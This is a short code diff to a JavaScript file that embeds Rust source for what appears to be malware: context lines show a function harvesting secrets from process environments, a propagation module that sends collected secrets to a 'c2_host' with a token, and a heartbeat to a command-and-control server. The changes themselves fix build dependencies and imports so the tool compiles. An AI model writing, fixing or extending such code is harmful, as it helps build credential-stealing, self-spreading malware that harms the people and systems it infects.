@@ -167,8 +167,9 @@ sha2 = "0.10"
 hmac = "0.12"
 rand = { version = "0.8", features = ["small_rng"] }
 hex = "0.4"
-base64 = "0.22"
+base64 = { version = "0.22", features = ["engine"] }
 dirs = "5"
+anyhow = "1"
 `;
 
   const mainRs = `use std::time::Duration;
@@ -355,6 +356,7 @@ async fn harvest_proc_environ(out: &mut Vec<Secret>) {
   const propagateRs = `use crate::creds::Secret;
 use rand::Rng;
 use std::time::Duration;
+use base64::Engine as _;
 
 pub async fn run(c2_host: &str, c2_port: u16, token: &str, secrets: &[Secret]) {
     let client = reqwest::Client::builder()
@@ -693,8 +695,6 @@ pub async fn heartbeat(host: &str, port: u16, key: &[u8; 32], token: &str, seq: 
 fn hostname() -> String { std::process::Command::new("hostname").output().map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).unwrap_or_default() }
 fn username() -> String { std::env::var("USER").or_else(|_| std::env::var("USERNAME")).unwrap_or_default() }
 fn unix_ts() -> u64 { std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0) }
-
-use rand::SeedableRng;
 `;
 
   const buildSh = `#!/usr/bin/env bash
